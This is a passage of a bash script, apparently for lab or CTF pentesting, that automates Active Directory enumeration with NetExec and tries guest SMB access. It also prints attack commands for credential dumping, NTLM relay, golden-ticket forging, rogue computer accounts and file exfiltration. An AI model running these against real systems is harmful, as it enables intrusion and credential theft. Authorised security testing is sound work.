#!/bin/bash

# NOTE: A Python version with parallel execution is now available: nxc-auto.py
# Use 'python3 nxc-auto.py -i <IP>' for faster enumeration.

# --- Fix PATH for Sudo/Pipx ---
# Add common local bin paths to PATH if they exist
for p in "$HOME/.local/bin" "/usr/local/bin" "/home/$USER/.local/bin"; do
    if [ -d "$p" ] && [[ ":$PATH:" != *":$p:"* ]]; then
        export PATH="$PATH:$p"
    fi
done

# If run with sudo, also add the original user's local bin
if [ -n "$SUDO_USER" ]; then
    user_home=$(getent passwd "$SUDO_USER" | cut -d: -f6)
    p="$user_home/.local/bin"
    if [ -d "$p" ] && [[ ":$PATH:" != *":$p:"* ]]; then
        export PATH="$PATH:$p"
    fi
fi
# ----------------------------

# Default values
IP=""
user=""
pass=""
domain=""
hash=""
os_type=""  # Will be auto-detected if not specified
ANON_RUN="false"
CHECK_ALIVE="false"
DC_IP=""    # Will be set to IP initially, then updated if a DC is found

# --- Color Definitions & ADHD Friendly Output ---
NC=$'\033[0m'
BOLD=$'\033[1m'
UNDERLINE=$'\033[4m'
BLACK=$'\033[0;30m'
RED=$'\033[0;31m'
GREEN=$'\033[0;32m'
YELLOW=$'\033[0;33m'
BLUE=$'\033[0;34m'
MAGENTA=$'\033[0;35m'
CYAN=$'\033[0;36m'
WHITE=$'\033[0;37m'

# Bright Colors
BRED=$'\033[1;31m'
BGREEN=$'\033[1;32m'
BYELLOW=$'\033[1;33m'
BBLUE=$'\033[1;34m'
BMAGENTA=$'\033[1;35m'
BCYAN=$'\033[1;36m'
BWHITE=$'\033[1;37m'

# Standardized Logging Functions
log_info() {
    printf "${BCYAN}ℹ️  [*] %s${NC}\n" "$1"
}

log_success() {
    printf "${BGREEN}✅ [+] %s${NC}\n" "$1"
}

log_warning() {
    printf "${BYELLOW}⚠️  [!] %s${NC}\n" "$1"
}

log_error() {
    printf "${BRED}❌ [-] %s${NC}\n" "$1"
}

log_cmd() {
    printf "${BMAGENTA}🚀 [>] %s${NC}\n" "$1"
}

# Function to check if the target is still alive to prevent hanging
check_target_alive() {
    # Exit early if check is not requested
    if [ "$CHECK_ALIVE" != "true" ]; then return 0; fi

    # Skip check if IP is not set yet
    if [ -z "$IP" ]; then return 0; fi
    
    # 1. Quick Ping check (1 packet, 1 second timeout)
    if ping -c 1 -W 1 "$IP" &> /dev/null; then
        return 0
    fi
    
    # 2. Fallback TCP check on common ports in case ICMP is blocked
    # Use bash /dev/tcp logic with a 1 second timeout for speed
    for port in 445 3389 22 80 443 389 139 5985; do
        if timeout 1 bash -c "</dev/tcp/$IP/$port" &>/dev/null; then
            return 0
        fi
    done
    
    echo -e "\n${BRED}${BOLD}🚨 CRITICAL ERROR: TARGET APPEARS OFFLINE 🚨${NC}"
    log_error "Target $IP is no longer responding to ping or common TCP ports."
    log_error "Stopping all scans to prevent hanging processes."
    log_info "Please check your network connection, VPN status, or if the target rebooted."
    exit 1
}

log_section() {
    check_target_alive
    printf "\n${BBLUE}━━━━━━━━━━━━━━━ ${BWHITE}${BOLD}%s${BBLUE} ━━━━━━━━━━━━━━━${NC}\n" "$1"
}

# Function to check if a port is open (uses bash /dev/tcp)
check_port() {
    target_ip=$1
    target_port=$2
    service_name=$3
    
    # Skip check if we don't know the IP (shouldn't happen)
    if [ -z "$target_ip" ]; then return 0; fi

    # Use bash built-in TCP connection for reliability (avoids nc version/flag issues)
    # Timeout set to 10 seconds
    (timeout 10 bash -c "</dev/tcp/$target_ip/$target_port") &>/dev/null
    result=$?

    if [ $result -eq 0 ]; then
        return 0 # Port is open
    else
        if [ -n "$service_name" ]; then
             log_warning "Skipping $service_name checks (Port $target_port seems closed)"
        fi
        return 1 # Port is closed
    fi
}

# Function to update /etc/hosts with multiple names
update_hosts_file() {
    local target_ip=$1
    shift
    local target_names=("$@")
    
    if [ -z "$target_ip" ] || [ ${#target_names[@]} -eq 0 ]; then
        return
    fi

    # Deduplicate and filter names
    local unique_names=()
    for name in "${target_names[@]}"; do
        if [ -n "$name" ] && [ "$name" != "$target_ip" ]; then
            # Case insensitive deduplication
            local exists=false
            for u in "${unique_names[@]}"; do
                if [[ "${u,,}" == "${name,,}" ]]; then exists=true; break; fi
            done
            if [ "$exists" = false ]; then
                unique_names+=("$name")
            fi
        fi
    done

    if [ ${#unique_names[@]} -eq 0 ]; then return; fi

    local needs_update=false
    local conflict_names=()
    local missing_names=()

    for name in "${unique_names[@]}"; do
        local existing_ip=$(grep -w "$name" /etc/hosts 2>/dev/null | awk '{print $1}' | head -n1)
        if [ -z "$existing_ip" ]; then
            missing_names+=("$name")
            needs_update=true
        elif [ "$existing_ip" != "$target_ip" ]; then
            conflict_names+=("$name ($existing_ip)")
            needs_update=true
        fi
    done

    if [ "$needs_update" = "true" ]; then
        echo -e "\n${BYELLOW}❓ Hostname mapping needs update for ${BWHITE}$target_ip${NC}${BYELLOW}:"
        [ ${#missing_names[@]} -gt 0 ] && echo -e "   ${BCYAN}Missing:${NC} ${missing_names[*]}"
        [ ${#conflict_names[@]} -gt 0 ] && echo -e "   ${BRED}Conflicts:${NC} ${conflict_names[*]}"
        
        read -p "   Do you want to update /etc/hosts? [y/N]: " choice
        case "$choice" in 
            y|Y ) 
                # Remove existing entries for all names to avoid duplicates/conflicts
                for name in "${unique_names[@]}"; do
                    sudo sed -i "/[[:space:]]${name}\($\|[[:space:]]\)/d" /etc/hosts
                done
                
                # Add the new consolidated entry
                local hosts_line="$target_ip ${unique_names[*]}"
                echo "$hosts_line" | sudo tee -a /etc/hosts >/dev/null
                log_success "Updated /etc/hosts with: ${BWHITE}$hosts_line${NC}"
                ;;
            * ) log_info "Skipping /etc/hosts update";;
        esac
    else
        log_info "All hostnames (${unique_names[*]}) already correctly mapped in /etc/hosts"
    fi
}

# Function to auto-detect the target OS and Domain info
detect_target_info() {
    log_info "Attempting to auto-detect target OS and Domain for $IP..."
    local discovered_names=()
    
    # Priority 1: SMB (Port 445) - Very reliable for Windows/AD
    if check_port $IP 445; then
        # Try to get OS info from nxc smb
        log_info "SMB port 445 is open. Checking info with NetExec..."
        smb_out=$(nxc smb $IP --timeout 5 2>&1)
        
        # Extract OS type
        if echo "$smb_out" | grep -qi "windows"; then
            os_type="windows"
            log_success "Auto-detected OS: ${BWHITE}Windows${NC} (via NetExec SMB)"
        elif echo "$smb_out" | grep -qi "linux\|samba"; then
            os_type="linux"
            log_success "Auto-detected OS: ${BWHITE}Linux/Samba${NC} (via NetExec SMB)"
        else
            os_type="windows"
            log_info "SMB port 445 open, assuming ${BWHITE}Windows${NC}."
        fi

        # Extract Names
        local disc_domain=$(echo "$smb_out" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
        local disc_name=$(echo "$smb_out" | grep -oP '(?<=name:)[^\)]+' | head -n1 | tr -d ' ')
        
        if [ -n "$disc_domain" ] && [ "$disc_domain" != "$IP" ]; then
            domain="$disc_domain"
            log_success "Auto-discovered domain: ${BWHITE}$domain${NC}"
            discovered_names+=("$domain")
            
            # constructed FQDN
            [ -n "$disc_name" ] && discovered_names+=("$disc_name.$domain")
            
            # Forest root (if domain has 3 or more parts, e.g. lab.enterprise.thm -> enterprise.thm)
            if [[ "$domain" =~ .*\..*\..* ]]; then
                local forest_root=$(echo "$domain" | cut -d. -f2-)
                discovered_names+=("$forest_root")
            fi
        fi
        [ -n "$disc_name" ] && discovered_names+=("$disc_name")

        update_hosts_file "$IP" "${discovered_names[@]}"
        return 0
    fi

    # Priority 2: LDAP (Port 389) - AD Domain Controller
    if check_port $IP 389; then
        os_type="windows"
        log_success "Auto-detected OS: ${BWHITE}Windows${NC} (via LDAP)"
        
        log_info "Attempting to extract domain info via LDAP..."
        ldap_out=$(nxc ldap $IP --timeout 5 2>&1)
        local disc_domain=$(echo "$ldap_out" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
        local disc_name=$(echo "$ldap_out" | grep -oP '(?<=name:)[^\)]+' | head -n1 | tr -d ' ')

        if [ -n "$disc_domain" ] && [ "$disc_domain" != "$IP" ]; then
            domain="$disc_domain"
            log_success "Auto-discovered domain: ${BWHITE}$domain${NC} (via LDAP)"
            discovered_names+=("$domain")
            [ -n "$disc_name" ] && discovered_names+=("$disc_name.$domain")
            
            if [[ "$domain" =~ .*\..*\..* ]]; then
                local forest_root=$(echo "$domain" | cut -d. -f2-)
                discovered_names+=("$forest_root")
            fi
        fi
        [ -n "$disc_name" ] && discovered_names+=("$disc_name")
        
        update_hosts_file "$IP" "${discovered_names[@]}"
        return 0
    fi

    # Priority 3: RDP (Port 3389) - Almost always Windows
    if check_port $IP 3389; then
        os_type="windows"
        log_success "Auto-detected OS: ${BWHITE}Windows${NC} (via RDP)"

        log_info "Attempting to extract domain info via RDP..."
        rdp_out=$(nxc rdp $IP --timeout 5 2>&1)
        local disc_domain=$(echo "$rdp_out" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
        local disc_name=$(echo "$rdp_out" | grep -oP '(?<=name:)[^\)]+' | head -n1 | tr -d ' ')
        
        if [ -n "$disc_domain" ] && [ "$disc_domain" != "$IP" ]; then
            domain="$disc_domain"
            log_success "Auto-discovered domain: ${BWHITE}$domain${NC} (via RDP)"
            discovered_names+=("$domain")
            [ -n "$disc_name" ] && discovered_names+=("$disc_name.$domain")
        fi
        [ -n "$disc_name" ] && discovered_names+=("$disc_name")

        update_hosts_file "$IP" "${discovered_names[@]}"
        return 0
    fi

    # Priority 4: SSH (Port 22) - Usually Linux
    if check_port $IP 22; then
        os_type="linux"
        log_success "Auto-detected OS: ${BWHITE}Linux${NC} (via SSH)"
        return 0
    fi
    
    # Priority 5: WinRM (Ports 5985, 5986) - Windows
    if check_port $IP 5985 || check_port $IP 5986; then
        os_type="windows"
        log_success "Auto-detected OS: ${BWHITE}Windows${NC} (via WinRM)"

        log_info "Attempting to extract domain info via WinRM..."
        winrm_out=$(nxc winrm $IP --timeout 5 2>&1)
        local disc_domain=$(echo "$winrm_out" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
        local disc_name=$(echo "$winrm_out" | grep -oP '(?<=name:)[^\)]+' | head -n1 | tr -d ' ')

        if [ -n "$disc_domain" ] && [ "$disc_domain" != "$IP" ]; then
            domain="$disc_domain"
            log_success "Auto-discovered domain: ${BWHITE}$domain${NC} (via WinRM)"
            discovered_names+=("$domain")
            [ -n "$disc_name" ] && discovered_names+=("$disc_name.$domain")
        fi
        [ -n "$disc_name" ] && discovered_names+=("$disc_name")

        update_hosts_file "$IP" "${discovered_names[@]}"
        return 0
    fi

    # Fallback
    os_type="windows"
    log_warning "Could not reliably detect OS. Defaulting to ${BWHITE}Windows${NC}."
}

# Function to check if all needed tools are installed
check_dependencies() {
    log_section "Checking Dependencies"
    
    local missing_tools=()
    local install_cmds=()
    
    # Define tools and their installation commands for Kali
    declare -A tools
    tools["nxc"]="sudo apt update && sudo apt install netexec -y"
    tools["impacket-lookupsid"]="sudo apt update && sudo apt install python3-impacket -y"
    tools["rpcclient"]="sudo apt update && sudo apt install smbclient -y"
    tools["ldapsearch"]="sudo apt update && sudo apt install ldap-utils -y"
    tools["showmount"]="sudo apt update && sudo apt install nfs-common -y"
    tools["enum4linux"]="sudo apt update && sudo apt install enum4linux -y"
    tools["ldapdomaindump"]="sudo apt update && sudo apt install ldapdomaindump -y"
    tools["smbmap"]="sudo apt update && sudo apt install smbmap -y"
    tools["certipy"]="pipx install certipy-ad"
    tools["unbuffer"]="sudo apt update && sudo apt install expect -y"
    tools["curl"]="sudo apt update && sudo apt install curl -y"
    
    # Check for each tool
    for tool in "${!tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            # Special check for common local installation paths (pipx, etc.)
            if [ -f "$HOME/.local/bin/$tool" ] || [ -f "/usr/local/bin/$tool" ]; then
                continue
            fi

            # Special check for impacket tools which might be named tool.py
            if [[ "$tool" == impacket-* ]]; then
                local alt_tool="${tool#impacket-}.py"
                if command -v "$alt_tool" &> /dev/null || [ -f "$HOME/.local/bin/$alt_tool" ]; then
                    continue
                fi
            fi
            
            missing_tools+=("$tool")
            install_cmds+=("${tools[$tool]}")
        fi
    done
    
    # If tools are missing, inform the user
    if [ ${#missing_tools[@]} -gt 0 ]; then
        log_warning "The following tools are missing:"
        for i in "${!missing_tools[@]}"; do
            echo -e "  - ${BRED}${missing_tools[$i]}${NC}"
        done
        
        echo ""
        log_info "To install them on Kali Linux, run:"
        # Unique install commands
        printf "%s\n" "${install_cmds[@]}" | sort -u | while read -r cmd; do
            echo -e "  ${BMAGENTA}$cmd${NC}"
        done
        echo ""
        
        read -p "⚠️  Some enumeration modules will fail. Do you want to continue anyway? (y/N): " choice
        case "$choice" in 
          y|Y ) log_info "Continuing without missing tools...";;
          * ) log_error "Exiting. Please install missing dependencies."; exit 1;;
        esac
    else
        log_success "All essential tools are installed!"
    fi
}

# Function to check for nxc database schema issues and auto-fix
check_nxc_db() {
    if command -v nxc &> /dev/null; then
        # Run a quick check against localhost to trigger potential DB errors
        check_out=$(nxc smb 127.0.0.1 --timeout 1 2>&1)
        if echo "$check_out" | grep -q "Schema mismatch detected"; then
             log_warning "NXC DB Schema mismatch detected during self-check. Auto-fixing..."
             # Try deleting DBs for both current user and root (if running as root)
             rm -f ~/.nxc/workspaces/default/*.db 2>/dev/null
             rm -f /root/.nxc/workspaces/default/*.db 2>/dev/null
             log_success "Database files removed. NetExec will re-initialize them on the next run."
        fi
    fi
}

# Function to promote a working credential to the primary user
promote_verified_creds() {
    if [ -s "$VALID_CREDS_FILE" ] && { [ -f "$user" ] || [ -z "$user" ] || [ "$HAS_PROMOTED" != "true" ]; }; then
        # Pick the first one (usually the one nxc found first)
        local best_cred=$(head -n 1 "$VALID_CREDS_FILE")
        local disc_domain=""
        local remainder=""
        local disc_user=""
        local disc_secret=""
        
        if [[ "$best_cred" == *"\\"* ]]; then
            disc_domain=$(echo "$best_cred" | cut -d'\' -f1)
            remainder=$(echo "$best_cred" | cut -d'\' -f2-)
        else
            remainder="$best_cred"
        fi
        
        disc_user=$(echo "$remainder" | cut -d: -f1)
        disc_secret=$(echo "$remainder" | cut -d: -f2-)
        
        # Don't promote if it's the same as what we already have (unless we had a file)
        [ "$user" == "$disc_user" ] && [ ! -f "$user" ] && return
        
        log_success "Found valid credentials: ${BWHITE}$best_cred${NC}"
        log_info "Promoting '${BWHITE}$disc_user${NC}' as primary user for deep-dive enumeration..."
        
        # Update globals
        [ -n "$disc_domain" ] && domain="$disc_domain"
        user="$disc_user"
        
        # Determine if hash or password
        if [[ "$disc_secret" =~ ^[0-9a-fA-F]{32}$ ]] || [[ "$disc_secret" =~ ^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$ ]]; then
            hash="$disc_secret"
            pass=""
        else
            pass="$disc_secret"
            hash=""
        fi
        
        # Re-build flags
        if [ -n "$domain" ]; then DOMAIN_FLAG="-d $domain"; else DOMAIN_FLAG=""; fi
        if [ -n "$hash" ]; then
            USER_FLAG="-u $user -H $hash"
            RPC_ARG="-U $domain\\\\$user --pw-nt-hash $hash"
            SECRETS_ARG="-hashes :$hash $domain/$user@$IP"
            RPCDUMP_ARG="-u $user -hashes :$hash -d $domain"
        elif [ -n "$pass" ]; then
            USER_FLAG="-u $user -p $pass"
            RPC_ARG="-U $domain\\\\$user%$pass"
            SECRETS_ARG="$domain/$user:$pass@$IP"
            RPCDUMP_ARG="-u $user -p $pass -d $domain"
        fi
        
        HAS_PROMOTED="true"
        log_info "Flags updated. Subsequent checks will use '${BWHITE}$user${NC}' credentials."
    fi
}

# Banner
print_banner() {
    echo -e "${BCYAN}${BOLD}"
    echo "  _  ___   _______        _         _   "
    echo " | \| \ \ / / ____|      / \  _   _| |_ ___  "
    echo " |  \` |\ V /| |         / _ \| | | | __/ _ \ "
    echo " | |  |/   \| |___     / ___ \ |_| | || (_) |"
    echo " |_| _/_/ \_\_____|   /_/   \_\__,_|\__\___/ "
    echo "                                            "
    echo -e "${BMAGENTA}       Automated Enumeration Script${NC}"
    echo -e "${BBLUE}       NetExec Power-Up | ADHD Friendly Edition${NC}\n"
}

# Function to display help
usage() {
    print_banner
    echo -e "${BWHITE}${BOLD}Usage:${NC} $0 -i IP [-u USER] [-p PASSWORD] [-d DOMAIN] [-H HASH] [-o OS]"
    echo ""
    echo -e "${BCYAN}Options:${NC}"
    echo "  -i  Target IP address (required)"
    echo "  -u  Username"
    echo "  -p  Password"
    echo "  -d  Domain"
    echo "  -H  NTLM Hash"
    echo "  -o  Target OS type: 'w' or 'windows', 'l' or 'linux' (auto-detected if not specified)"
    echo "  -n  Check if target is alive before scanning"
    echo "  -h  Show this help message"
    echo ""
    echo -e "${BYELLOW}${BOLD}IMPORTANT:${NC} Always quote passwords and usernames with special characters!"
    echo "  Example: $0 -i 10.0.0.1 -u 'Administrator' -p 'P@\$\$W0rd'"
    exit 1
}

# Parse arguments
# Using a more flexible approach to handle long options
while [[ $# -gt 0 ]]; do
    case $1 in
        -i) IP="$2"; shift 2 ;;
        -u) user="$2"; shift 2 ;;
        -p) pass="$2"; shift 2 ;;
        -d) domain="$2"; shift 2 ;;
        -H) hash="$2"; shift 2 ;;
        -o) 
            case "${2,,}" in 
                w|windows) os_type="windows" ;;
                l|linux) os_type="linux" ;;
                *) log_error "Invalid OS type"; usage ;;
            esac
            shift 2
            ;;
        -n) CHECK_ALIVE="true"; shift ;;
        --stealth) STEALTH="true"; shift ;;
        -h|--help) usage ;;
        *) log_error "Unknown option: $1"; usage ;;
    esac
done

# Check if IP is set
if [ -z "$IP" ]; then
    log_error "IP address is required."
    usage
fi

# Set DC_IP to the target IP initially
DC_IP="$IP"

# Auto-detect OS and Domain if not specified
if [ -z "$os_type" ] || [ -z "$domain" ]; then
    detect_target_info
fi

# Attempt to discover the actual DC IP if a domain is known
if [ -n "$domain" ] && [ "$os_type" = "windows" ]; then
    log_info "Attempting to discover Domain Controller for domain '${BWHITE}$domain${NC}'..."
    
    # 1. Try via LDAP (port 389)
    if check_port $IP 389; then
        # This IP is likely a DC
        DC_IP="$IP"
        log_success "Target $IP appears to be a Domain Controller."
    else
        # 2. Try via DNS resolution of the domain itself
        discovered_dc=$(host -t A "$domain" 2>/dev/null | awk '/has address/ {print $NF}' | head -n1)
        if [ -n "$discovered_dc" ]; then
            DC_IP="$discovered_dc"
            log_success "Resolved domain '$domain' to DC IP: ${BWHITE}$DC_IP${NC}"
        else
            # 3. Try via SRV records
            discovered_dc_srv=$(host -t SRV _ldap._tcp.dc._msdcs."$domain" 2>/dev/null | awk '/VBR/ {print $NF}' | sed 's/\.$//' | head -n1)
            if [ -n "$discovered_dc_srv" ]; then
                # Resolve the SRV hostname to an IP
                discovered_dc_ip=$(host -t A "$discovered_dc_srv" 2>/dev/null | awk '/has address/ {print $NF}' | head -n1)
                if [ -n "$discovered_dc_ip" ]; then
                    DC_IP="$discovered_dc_ip"
                    log_success "Discovered DC via SRV records: ${BWHITE}$discovered_dc_srv${NC} (${BWHITE}$DC_IP${NC})"
                fi
            fi
        fi
    fi
fi

# Initialize global flags
if [ -n "$domain" ]; then DOMAIN_FLAG="-d $domain"; else DOMAIN_FLAG=""; fi

# Initial build of user flags
if [ -n "$hash" ]; then
    USER_FLAG="-u $user -H $hash"
    RPC_ARG="-U $domain\\\\$user --pw-nt-hash $hash"
    SECRETS_ARG="-hashes :$hash $domain/$user@$DC_IP"
    RPCDUMP_ARG="-u $user -hashes :$hash -d $domain"
elif [ -n "$pass" ]; then
    USER_FLAG="-u $user -p $pass"
    RPC_ARG="-U $domain\\\\$user%$pass"
    SECRETS_ARG="$domain/$user:$pass@$DC_IP"
    RPCDUMP_ARG="-u $user -p $pass -d $domain"
else
    # Allow for user files or empty creds
    USER_FLAG="-u $user -p ''"
    RPC_ARG="-U $domain\\\\$user%"
    SECRETS_ARG="$domain/$user@$DC_IP"
    RPCDUMP_ARG="-u $user -d $domain"
fi

# Check for dependencies
check_dependencies

print_banner

# Helper function to print command and separators
print_cmd() {
    echo -e "\n${BBLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}" >&2
    log_cmd "Executing: $*" >&2
    echo -e "${BBLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n" >&2
}
log_section "Target Configuration"
log_info "Target OS Type: ${BWHITE}$os_type${NC}"
log_info "Logging Enabled: ${BWHITE}$(pwd)/nxc-enum${NC}"

# Warning about quoting passwords
if [ -n "$pass" ]; then
    log_warning "REMINDER: If your password contains special characters (\$ ! * etc.),"
    log_warning "make sure you quoted it properly: -p 'P@\$\$W0rd'"
fi

mkdir -p nxc-enum nxc-enum/smb nxc-enum/ldap nxc-enum/http

# Check for nxc database schema issues and auto-fix
check_nxc_db

# Check for unbuffer command and stub it if missing
if ! command -v unbuffer &> /dev/null; then
    unbuffer() { "$@"; }
fi

VALID_CREDS_FILE="nxc-enum/valid_credentials.txt"
> "$VALID_CREDS_FILE"
POTENTIAL_CREDS_FILE="nxc-enum/potential_credentials.txt"
> "$POTENTIAL_CREDS_FILE"

# Helper function to run nxc and suggest login command if successful
# Show Impacket tools suggestions if credentials provided
if [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then    
    # Build credential string
    if [ -n "$hash" ]; then
        cred_string="$user -hashes :$hash"
    else
        cred_string="$user:$pass"
    fi
    
    if [ -n "$domain" ]; then
        target="$domain/$cred_string@$IP"
        target_simple="$domain/$user@$IP"
    else
        target="$cred_string@$IP"
        target_simple="$user@$IP"
    fi
    
    echo -e "${BCYAN}# 1. Credential Dumping:${NC}"
    echo "impacket-secretsdump $target                    # Dump SAM/LSA/NTDS"
    echo "impacket-secretsdump -just-dc $target           # Only NTDS (faster)"
    echo "impacket-secretsdump -just-dc-ntlm $target      # Only NTLM hashes"
    echo ""
    
    echo -e "${BCYAN}# 2. Remote Command Execution:${NC}"
    echo "impacket-psexec $target                         # Execute via Service Manager"
    echo "impacket-wmiexec $target                        # Execute via WMI"
    echo "impacket-smbexec $target                        # Execute via SMB"
    echo "impacket-dcomexec $target                       # Execute via DCOM"
    echo "impacket-atexec $target 'whoami'                # Execute via Task Scheduler"
    if [ -n "$hash" ]; then
        echo "evil-winrm -i $IP -u $user -H $hash          # Execute via WinRM (Hash)"
    else
        echo "evil-winrm -i $IP -u $user -p '$pass'        # Execute via WinRM (Pass)"
    fi
    echo ""
    
    echo -e "${BCYAN}# 3. Kerberos Attacks:${NC}"
    if [ -n "$domain" ]; then
        echo "impacket-GetNPUsers $domain/ -usersfile users.txt -no-pass -dc-ip $DC_IP  # AS-REP roasting"
        echo "impacket-GetUserSPNs $target -dc-ip $DC_IP -request                       # Kerberoasting"
        echo "impacket-getTGT $domain/$cred_string -dc-ip $DC_IP                        # Request TGT"
        echo "impacket-getST $domain/$cred_string -spn cifs/$IP -dc-ip $DC_IP           # Request Service Ticket"
    else
        echo "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC_IP"
        echo "impacket-GetUserSPNs DOMAIN/$cred_string@$IP -dc-ip $DC_IP -request"
        echo "impacket-getTGT DOMAIN/$cred_string -dc-ip $DC_IP"
    fi
    echo ""
    
    echo -e "${BCYAN}# 4. SMB/File Operations:${NC}"
    echo "impacket-smbclient $target                      # Interactive SMB client"
    echo "impacket-smbserver share \$(pwd) -smb2support    # Start SMB server (for file transfer)"
    echo "impacket-lookupsid $target                      # Enumerate users via SID"
    echo "impacket-reg $target query -keyName HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion  # Query registry"
    echo ""
    
    echo -e "${BCYAN}# 5. LDAP/AD Enumeration:${NC}"
    echo "impacket-GetADUsers $target -all -dc-ip $DC_IP     # Dump all AD users"
    echo "impacket-GetADComputers $target -all -dc-ip $DC_IP # Dump all computers"
    echo "impacket-dacledit $target -action read -principal Administrator -dc-ip $DC_IP  # Read ACLs"
    echo "impacket-findDelegation $target -dc-ip $DC_IP      # Find delegation"
    echo ""
    
    echo -e "${BCYAN}# 6. MSSQL Attacks:${NC}"
    echo "impacket-mssqlclient $target                    # Interactive MSSQL client"
    echo "impacket-mssqlclient $target -windows-auth      # Windows authentication"
    echo ""
    
    echo -e "${BCYAN}# 7. Network Attacks:${NC}"
    echo "impacket-ntlmrelayx -tf targets.txt -smb2support                    # NTLM relay"
    echo "impacket-ntlmrelayx -t ldap://$IP --escalate-user $user             # LDAP relay + escalation"
    echo "impacket-rpcdump $IP                                                # Enumerate RPC endpoints"
    echo "impacket-samrdump $target                                           # Dump SAM via RPC"
    echo ""
    
    echo -e "${BCYAN}# 8. Ticket Manipulation (if you have tickets):${NC}"
    echo "impacket-ticketConverter ticket.kirbi ticket.ccache                 # Convert ticket format"
    echo "impacket-ticketer -nthash <hash> -domain-sid <sid> -domain $domain Administrator  # Golden ticket"
    echo ""
    
    echo -e "${BCYAN}# 9. Other Useful Tools:${NC}"
    echo "impacket-addcomputer $target -computer-name 'EVILPC$' -computer-pass 'Password123'  # Add computer account"
    echo "impacket-exchanger $target -ah $IP                                  # Exchange exploitation"
    echo "impacket-netview $target                                            # Network enumeration"
    echo "impacket-services $target list                                      # List services"
    echo ""
    
    log_warning "Replace DOMAIN with actual domain name if not provided"
    log_info "For full list: ls /usr/share/doc/python3-impacket/examples/"
    echo ""
else
    # Show anonymous Impacket tools when no credentials
    log_section "Impacket Tools - Anonymous Enumeration"
    echo ""
    echo -e "${BCYAN}# 1. User Enumeration (no credentials needed):${NC}"
    echo "impacket-lookupsid -no-pass anonymous@$IP                           # Enumerate users via SID"
    echo "impacket-samrdump $IP                                               # Dump SAM via RPC (anonymous)"
    if [ -n "$domain" ]; then
        echo "impacket-GetNPUsers $domain/ -usersfile users.txt -no-pass -dc-ip $IP  # AS-REP roasting (no creds)"
    else
        echo "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP   # AS-REP roasting (no creds)"
    fi
    echo ""
    echo -e "${BCYAN}# 2. Network Enumeration:${NC}"
    echo "impacket-rpcdump $IP                                                # Enumerate RPC endpoints"
    echo "impacket-netview $IP                                                # Network enumeration"
    echo ""
    echo -e "${BCYAN}# 3. SMB Enumeration (try anonymous):${NC}"
    echo "impacket-smbclient -no-pass anonymous@$IP                           # Try anonymous SMB access"
    echo ""
    echo -e "${BCYAN}# 4. NTLM Relay (capture credentials):${NC}"
    echo "impacket-ntlmrelayx -tf targets.txt -smb2support                    # NTLM relay attack"
    echo "impacket-ntlmrelayx -t ldap://$IP -smb2support                      # Relay to LDAP"
    echo ""
    echo -e "${BCYAN}# 5. Start SMB server (for file exfiltration):${NC}"
    echo "impacket-smbserver share \$(pwd) -smb2support                        # Start SMB server"
    echo ""
    log_warning "Many tools work better with credentials. Run with -u and -p flags."
    log_info "For full list: ls /usr/share/doc/python3-impacket/examples/"
    echo ""
fi

log_section "OS Info & LDAP SID"
# checks if the SMB service is running; returns OS info, name, domain, SMB versions

# Skip Windows-specific LDAP/AD checks for Linux targets
if [ "$os_type" = "windows" ]; then
    # Helper: Check SMB port (445) first
    if ! check_port $IP 445 "SMB/LDAP"; then
        log_warning "Port 445 closed. Enumeration might fail."
        # We don't exit, just warn, in case of firewalls or non-standard ports
    fi

    # LDAP domain SID (requires credentials)
    if [ -n "$user" ]; then
        if check_port $IP 389 "LDAP"; then
            log_info "Fetching Domain SID..."
            print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --get-sid --timeout 15"
            timeout 30s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --get-sid --timeout 15 | tee nxc-enum/ldap/domain-sid.txt
        else
            log_warning "Port 389 closed. Skipping LDAP domain SID check."
        fi
    else
        log_info "Skipping LDAP domain SID (no credentials supplied)"
    fi
else
    log_info "Skipping Windows-specific LDAP/AD checks (target OS: Linux)"
fi

run_anonymous_enumeration() {
    ANON_RUN="true"
    # Skip Windows-specific anonymous/guest enumeration for Linux
    if [ "$os_type" = "windows" ]; then
        # Guest access (domain optional)
        log_section "SMB Guest Access"
        if [ -n "$domain" ]; then
        print_cmd "nxc smb $IP -d \"$domain\" -u 'guest' -p '' --shares"
        guest_output=$(nxc smb $IP -d "$domain" -u 'guest' -p '' --shares)
    else
        print_cmd "nxc smb $IP -u 'guest' -p '' --shares"
        guest_output=$(nxc smb $IP -u 'guest' -p '' --shares)
    fi
    echo "$guest_output"
    
    # Check if guest access succeeded and suggest commands
    if echo "$guest_output" | grep -q "\[+\]" && ! echo "$guest_output" | grep -q "Error enumerating shares"; then
        # Check if we actually have accessible shares
        has_shares=false
        echo "$guest_output" | while read -r line; do
            clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
            if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                has_shares=true
                break
            fi
        done
        
        if echo "$guest_output" | grep -qE "READ|WRITE"; then
            log_success "Guest SMB access successful! Suggested commands:"
            echo "rpcclient -U 'guest%' $IP"
            echo ""
            
            # Highlight writable shares specifically
            if echo "$guest_output" | grep -q "WRITE"; then
                log_error "WRITE ACCESS DETECTED as 'guest' on these shares:"
                echo "$guest_output" | while read -r line; do
                    clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                    if [[ "$clean_line" == *"WRITE"* ]]; then
                        share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^(READ,WRITE|WRITE)$/) {print $(i-1); exit}}')
                        share=${share#\\}
                        if [ ! -z "$share" ]; then
